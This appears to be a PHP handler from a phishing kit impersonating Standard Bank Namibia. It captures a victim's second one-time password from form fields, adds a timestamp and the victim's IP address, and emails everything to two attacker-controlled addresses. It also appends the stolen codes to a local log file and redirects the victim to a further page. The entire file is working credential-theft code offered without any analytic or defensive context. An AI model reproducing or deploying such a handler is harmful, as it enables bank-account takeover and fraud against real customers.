<?php
session_start();
$date = gmdate("Y/m/d | H:i:s");
$ip = $_SERVER['REMOTE_ADDR'];


$input1 = $_POST['input1'];
$input2 = $_POST['input2'];
$input3 = $_POST['input3'];
$input4 = $_POST['input4'];
$input5 = $_POST['input5'];
$message .="
Second OTP :   ".$input1."  ".$input2." ".$input3." ".$input4." ".$input5."

====================== 	PC-INFO ====================||
Date / time	    : $date
Client IP         : http://www.geoiptool.com/?IP=$ip
=========||Standard Bank Namibia log |=====================||\n";
$send="kute7ty@gmail.com,amarok101@outlook.com";
$subject = "Standard Bank Namibia | $ip";
mail($send,$subject,$message);
@fclose(@fwrite(@fopen("../log/otp2.txt", "a"),$message));
    @mail($to,$subject,$message,$headers);

die("<script>location.href = '../email/default.php'</script>");
?>